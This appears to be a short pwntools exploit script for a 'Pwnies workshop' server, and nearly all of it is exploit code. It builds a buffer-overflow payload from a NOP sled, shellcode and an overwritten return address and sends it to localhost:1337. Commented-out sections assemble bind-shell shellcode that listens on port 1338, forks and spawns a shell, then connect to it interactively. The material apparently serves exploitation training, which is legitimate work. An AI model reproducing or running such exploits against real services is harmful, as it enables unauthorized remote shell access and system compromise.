#!/usr/bin/env python

# Pwnies workshop server

import sys
from pwn import *
from pwn.i386.linux import *

def doit(shellcode):
    sock = remote('localhost', 1337)
    eip = p32(0x0804aa00)
    sock.send(nops(0xd4 - len(shellcode)) + shellcode + eip + '\n')

# doit('\xeb\xfe')

print nops(int(sys.argv[1]), saved = ['eax', 'ebx', 'ecx', 'edx', 'esp', 'ebp', 'esi', 'edi'])

# sock.recvline()
# sock.send('foo\n')
# sock.recvline(2)

# heap_buffer = p(0x0804a080)

# # shellcode = assemble(
# #     listen(1338),
# #     'xchg eax, ebx',
# #     dup(),
# #     sh()
# #     )

# shellcode = assemble(
#     # echo('yeah baby\n'),
#     # 'int3',
#     'sub esp, 0x100',
#     'mylabel:',
#     listen(1338),
#     fork('mylabel'),
#     'xchg ebp, ebx',
#     dup(),
#     sh()
#     )

# # open('/tmp/foo', 'w').write(shellcode)

# payload = shellcode + 'A' * (0xd4 - len(shellcode)) + heap_buffer + '\n'
# sock.send(payload)
# sock.close()

# # sock = Remote('localhost', 1338)
# # sock.interactive()

# # print '\nback from interactive'
